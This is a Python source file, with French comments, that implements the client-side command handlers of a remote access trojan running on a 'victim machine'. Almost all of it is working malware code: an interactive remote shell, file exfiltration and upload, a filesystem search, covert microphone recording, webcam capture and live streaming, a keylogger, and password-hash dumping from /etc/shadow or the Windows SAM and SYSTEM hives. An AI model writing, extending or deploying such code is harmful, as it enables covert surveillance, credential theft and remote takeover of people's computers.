"""
Actions exécutées sur la machine victime (client RAT).

Chaque fonction correspond à une commande disponible dans le RAT.
Ce fichier est importé par client_app.py qui route les commandes
reçues du serveur vers la bonne fonction.

Compatibilité : Windows et Linux.
"""

import base64
import io
import locale
import platform
import socket
import subprocess
import wave
from pathlib import Path

import sounddevice

from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

logger = setup_logger("client.actions")

# ---------------------------------------------------------------------------
# Keylogger state
# ---------------------------------------------------------------------------

_keylogger_listener = None  # pynput Listener instance, or None if not running
_keylogger_buffer: list[str] = []


# ---------------------------------------------------------------------------
# Helpers internes
# ---------------------------------------------------------------------------


def _get_os() -> str:
    """Retourne le nom du système d'exploitation ('Windows' ou 'Linux')."""
    return platform.system()


def _run_command(command: str) -> str:
    """
    Exécute une commande shell et retourne la sortie sous forme de texte.
    Gère automatiquement l'encodage selon l'OS (cp850 sur Windows).

    Args:
        command: Commande shell à exécuter.

    Returns:
        str: Sortie de la commande (stdout ou stderr).
    """
    os_name = _get_os()
    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"


# ---------------------------------------------------------------------------
# ipconfig — configuration réseau
# ---------------------------------------------------------------------------


def get_ipconfig() -> str:
    """
    Retourne la configuration réseau de la machine.

    - Windows : exécute 'ipconfig /all'
    - Linux   : exécute 'ip addr'

    Returns:
        str: Sortie de la commande réseau.
    """
    os_name = _get_os()
    command = "ipconfig /all" if os_name == "Windows" else "ip addr"
    logger.info("ipconfig : commande '%s'", command)
    return _run_command(command)


# ---------------------------------------------------------------------------
# sysinfo — informations système
# ---------------------------------------------------------------------------


def get_system_info() -> str:
    """
    Retourne les informations système.

    - Windows : exécute 'systeminfo'
    - Linux   : exécute 'uname -a'

    Returns:
        str: Sortie de la commande système.
    """
    os_name = _get_os()
    command = "systeminfo" if os_name == "Windows" else "uname -a"
    logger.info("sysinfo : commande '%s'", command)
    return _run_command(command)


# ---------------------------------------------------------------------------
# screenshot — capture d'écran
# ---------------------------------------------------------------------------


def take_screenshot() -> str:
    """
    Prend une capture d'écran de la machine victime.

    Utilise Pillow (PIL.ImageGrab) pour capturer l'écran entier,
    puis encode le résultat en base64 pour le protocole JSON.

    Returns:
        str: Image JPEG encodée en base64, ou chaîne vide en cas d'erreur.
    """
    try:
        from PIL import ImageGrab

        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG")
        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
        logger.info("Screenshot pris (%d octets)", len(buffer.getvalue()))
        return encoded

    except Exception as exc:
        logger.exception("Erreur lors du screenshot : %s", exc)
        return ""


# ---------------------------------------------------------------------------
# shell — shell interactif
# ---------------------------------------------------------------------------


def handle_shell(conn: socket.socket) -> None:
    """
    Ouvre un shell interactif avec le serveur.

    Attend des messages 'shell_input' depuis le serveur,
    exécute chaque commande, et renvoie le résultat.
    S'arrête quand le serveur envoie 'shell_stop'.

    Args:
        conn: Socket TLS connectée au serveur.
    """
    os_name = _get_os()
    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)
    logger.info("Shell interactif ouvert (OS: %s)", os_name)

    while True:
        try:
            data = conn.recv(65536)
            if not data:
                break

            message = decode_message(data.decode("utf-8").strip())

            # Arrêt du shell demandé par le serveur
            if message.get("command") == "shell_stop":
                logger.info("Shell : arrêt demandé par le serveur")
                break

            # Exécution d'une commande shell
            if message.get("type") == "shell_input":
                cmd = message.get("input", "")
                logger.info("Shell : exécution de '%s'", cmd)

                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding=encoding,
                    errors="replace",
                    check=False,
                )
                output = result.stdout + result.stderr
                conn.sendall(encode_message({"type": "shell_output", "output": output}))

        except Exception as exc:
            logger.exception("Erreur dans le shell interactif : %s", exc)
            break


# ---------------------------------------------------------------------------
# download — envoi d'un fichier de la victime vers le serveur
# ---------------------------------------------------------------------------


def handle_download(remote_path: str) -> dict:
    """
    Lit un fichier sur la machine victime et l'encode en base64
    pour l'envoyer au serveur.

    Le serveur a demandé ce fichier via la commande 'download <path>'.
    Le contenu est encodé en base64 car le protocole est JSON (texte).

    Args:
        remote_path: Chemin absolu ou relatif du fichier sur la victime.

    Returns:
        dict: Réponse avec le contenu encodé en base64, ou une erreur.
    """
    path = Path(remote_path)

    # Vérification que le fichier existe
    if not path.exists():
        logger.warning("Download demandé mais fichier introuvable : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Fichier introuvable : {remote_path}",
        }

    # Vérification que c'est bien un fichier (pas un dossier)
    if not path.is_file():
        logger.warning("Download demandé mais le chemin n'est pas un fichier : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Le chemin n'est pas un fichier : {remote_path}",
        }

    try:
        # Lecture binaire + encodage base64 pour passer dans le JSON
        file_bytes = path.read_bytes()
        encoded = base64.b64encode(file_bytes).decode("utf-8")

        logger.info("Download : %s (%s octets)", remote_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "download",
            "filename": path.name,
            "data": encoded,
            "output": f"Fichier envoyé : {path.name} ({len(file_bytes)} octets)",
        }

    except PermissionError:
        logger.warning("Download refusé (permissions) : %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Permission refusée : {remote_path}",
        }

    except Exception as exc:
        logger.exception("Erreur lors du download de %s : %s", remote_path, exc)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# upload — réception d'un fichier envoyé par le serveur
# ---------------------------------------------------------------------------


def handle_upload(message: dict) -> dict:
    """
    Reçoit un fichier envoyé par le serveur et l'écrit sur la victime.

    Le serveur a encodé le fichier en base64 dans le message.
    On le décode et on l'écrit dans le répertoire courant de l'agent.

    Args:
        message: Message du serveur contenant 'filename' et 'data' (base64).

    Returns:
        dict: Confirmation d'écriture ou message d'erreur.
    """
    filename = message.get("filename", "uploaded_file")
    encoded_data = message.get("data", "")

    if not encoded_data:
        logger.warning("Upload reçu mais aucune donnée dans le message")
        return {
            "type": "command_result",
            "command": "upload",
            "error": "Aucune donnée reçue.",
        }

    try:
        # Décodage base64 → bytes → écriture sur disque
        file_bytes = base64.b64decode(encoded_data)
        save_path = Path(filename)
        save_path.write_bytes(file_bytes)

        logger.info("Upload reçu et sauvegardé : %s (%s octets)", save_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "upload",
            "output": f"Fichier reçu et sauvegardé : {save_path} ({len(file_bytes)} octets)",
        }

    except Exception as exc:
        logger.exception("Erreur lors de l'upload de %s : %s", filename, exc)
        return {
            "type": "command_result",
            "command": "upload",
            "error": f"Erreur : {exc}",
        }


# ---------------------------------------------------------------------------
# search — rechercher un fichier sur la machine victime
# ---------------------------------------------------------------------------


def search_file(filename: str) -> str:
    """
    Recherche un fichier par nom sur toute la machine victime.

    Args:
        filename: Nom du fichier à chercher (ex: "passwords.txt").

    Returns:
        str: Liste des chemins trouvés, ou message si aucun résultat.
    """
    results = []

    # Recherche récursive depuis la racine
    root = Path("C:/") if _get_os() == "Windows" else Path("/")

    for path in root.rglob(filename):
        try:
            results.append(str(path))
        except PermissionError:
            continue

    if not results:
        return f"Aucun fichier trouvé pour : {filename}"

    return "\n".join(results)


# ---------------------------------------------------------------------------
# record_audio — enregistrement micro
# ---------------------------------------------------------------------------

AUDIO_SAMPLE_RATE = 44100  # Hz (qualité CD)
AUDIO_CHANNELS = 1  # mono


def record_audio(duration: int = 5) -> str:
    """
    Enregistre l'audio depuis le micro de la victime et retourne un WAV en base64.

    Utilise sounddevice pour capturer le PCM int16, puis emballe dans un
    conteneur WAV (module wave stdlib) et encode en base64 pour le JSON.

    Args:
        duration: Durée d'enregistrement en secondes (défaut : 5).

    Returns:
        str: Données audio WAV encodées en base64.
    """
    logger.info("Enregistrement audio pendant %s seconde(s)...", duration)

    # 1. Capture depuis le micro par défaut en PCM 16 bits
    frames = sounddevice.rec(
        int(duration * AUDIO_SAMPLE_RATE),
        samplerate=AUDIO_SAMPLE_RATE,
        channels=AUDIO_CHANNELS,
        dtype="int16",
    )
    sounddevice.wait()  # bloque jusqu'à la fin de l'enregistrement

    logger.info("Enregistrement terminé (%s frames capturées)", len(frames))

    # 2. Écriture en mémoire dans un conteneur WAV (pas de fichier temporaire)
    wav_buffer = io.BytesIO()
    with wave.open(wav_buffer, "wb") as wav_file:
        wav_file.setnchannels(AUDIO_CHANNELS)
        wav_file.setsampwidth(2)  # 2 octets = 16 bits par sample
        wav_file.setframerate(AUDIO_SAMPLE_RATE)
        wav_file.writeframes(frames.tobytes())

    # 3. Encodage base64 pour transport JSON
    return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")


# ---------------------------------------------------------------------------
# webcam_snapshot — capture d'une photo webcam
# ---------------------------------------------------------------------------


def webcam_snapshot() -> str:
    """
    Capture une photo depuis la webcam de la victime.

    Ouvre la caméra par défaut (index 0), lit une frame,
    l'encode en JPEG, puis retourne le résultat en base64
    pour le protocole JSON.

    Returns:
        str: Image JPEG encodée en base64, ou chaîne vide en cas d'erreur.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_snapshot: pas de webcam disponible (index 0)")
        return ""

    try:
        success, frame = cam.read()
        if not success:
            logger.warning("webcam_snapshot: impossible de lire la frame")
            return ""

        _, buffer = cv2.imencode(".jpg", frame)
        encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
        logger.info("webcam_snapshot: frame capturée (%d octets)", len(buffer))
        return encoded

    except Exception as exc:
        logger.exception("webcam_snapshot erreur : %s", exc)
        return ""

    finally:
        cam.release()


# ---------------------------------------------------------------------------
# webcam_stream — diffusion vidéo en direct
# ---------------------------------------------------------------------------


def webcam_stream(conn: socket.socket) -> None:
    """
    Diffuse le flux webcam en direct vers le serveur.

    Chaque frame est envoyée sous la forme {"type": "stream_frame", "data": "<base64 JPEG>"}.
    La boucle s'arrête quand le serveur envoie {"type": "stream_stop"} ou en cas d'erreur.

    Args:
        conn: Socket TLS connectée au serveur.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_stream: pas de webcam disponible (index 0)")
        conn.sendall(encode_message({"type": "stream_error", "error": "No webcam available"}))
        return

    conn.settimeout(0.05)  # timeout court pour vérifier le signal stop entre les frames

    try:
        while True:
            success, frame = cam.read()
            if not success:
                logger.warning("webcam_stream: impossible de lire la frame")
                break

            # Encodage JPEG puis base64 (même logique que webcam_snapshot)
            _, buffer = cv2.imencode(".jpg", frame)
            encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
            conn.sendall(encode_message({"type": "stream_frame", "data": encoded}))

            # Vérification non-bloquante d'un signal stop
            try:
                raw = conn.recv(4096)
                if raw:
                    msg = decode_message(raw.decode("utf-8").strip())
                    if msg.get("type") == "stream_stop":
                        break
            except TimeoutError:
                pass  # pas de signal stop, on continue

    except Exception as exc:
        logger.exception("webcam_stream erreur : %s", exc)

    finally:
        cam.release()
        conn.settimeout(None)  # rétablir le mode bloquant
        logger.info("webcam_stream: arrêté")


# ---------------------------------------------------------------------------
# keylogger — enregistrement des frappes clavier
# ---------------------------------------------------------------------------


def toggle_keylogger() -> str:
    """
    Démarre ou arrête le keylogger.

    - Premier appel  : démarre un listener en arrière-plan, retourne une confirmation.
    - Deuxième appel : arrête le listener, retourne toutes les touches capturées.

    Utilise pynput.keyboard.Listener qui tourne dans un thread séparé.

    Returns:
        str: Message de statut, ou les touches capturées à l'arrêt.
    """
    from pynput import keyboard

    global _keylogger_listener, _keylogger_buffer

    # --- Arrêt ---
    if _keylogger_listener is not None:
        _keylogger_listener.stop()
        _keylogger_listener = None
        captured = "".join(_keylogger_buffer)
        _keylogger_buffer = []
        logger.info("Keylogger stopped. %d chars captured.", len(captured))
        return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"

    # --- Démarrage ---
    def on_press(key: keyboard.Key) -> None:
        try:
            _keylogger_buffer.append(key.char)
        except AttributeError:
            # Touches spéciales (Entrée, Maj, etc.)
            _keylogger_buffer.append(f"[{key.name}]")

    _keylogger_listener = keyboard.Listener(on_press=on_press)
    _keylogger_listener.start()
    logger.info("Keylogger started.")
    return "Keylogger started."


# ---------------------------------------------------------------------------
# hashdump — récupération des hashes de mots de passe
# ---------------------------------------------------------------------------


def hashdump() -> str:
    """
    Récupère les hashes de mots de passe selon l'OS.

    - Linux   : lit /etc/shadow (nécessite les droits root)
    - Windows : sauvegarde les ruches SAM et SYSTEM via reg.exe
                (nécessite les droits Administrateur)

    Returns:
        str: Contenu du fichier shadow, chemins des ruches, ou message d'erreur.
    """
    import tempfile

    os_name = _get_os()

    if os_name == "Linux":
        shadow_path = Path("/etc/shadow")
        try:
            content = shadow_path.read_text(encoding="utf-8")
            logger.info("hashdump Linux: %d lignes récupérées", content.count("\n"))
            return content
        except PermissionError:
            logger.warning("hashdump: permission refusée pour %s (root requis)", shadow_path)
            return f"Error: permission denied to read {shadow_path} (root required)"
        except FileNotFoundError:
            return f"Error: {shadow_path} not found"
        except Exception as exc:
            logger.exception("hashdump Linux error: %s", exc)
            return f"Error: {exc}"

    elif os_name == "Windows":
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                sam_path = str(Path(tmpdir) / "SAM")
                system_path = str(Path(tmpdir) / "SYSTEM")

                # Sauvegarde des ruches
                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
                    result = subprocess.run(
                        ["reg", "save", hive, dest, "/y"],
                        capture_output=True,
                        text=True,
                        check=False,
                    )
                    if result.returncode != 0:
                        logger.warning("hashdump Windows erreur sur %s: %s", hive, result.stderr.strip())
                        return f"Error saving {hive}: {result.stderr.strip()}"

                logger.info("hashdump Windows: ruches SAM et SYSTEM sauvegardées")
                return (
                    f"Hives saved:\n"
                    f"  SAM    -> {sam_path}\n"
                    f"  SYSTEM -> {system_path}\n"
                    "(Binary files — use secretsdump or impacket to extract hashes)"
                )
        except Exception as exc:
            logger.exception("hashdump Windows error: %s", exc)
            return f"Error: {exc}"

    else:
        return f"Unsupported OS for hashdump: {os_name}"
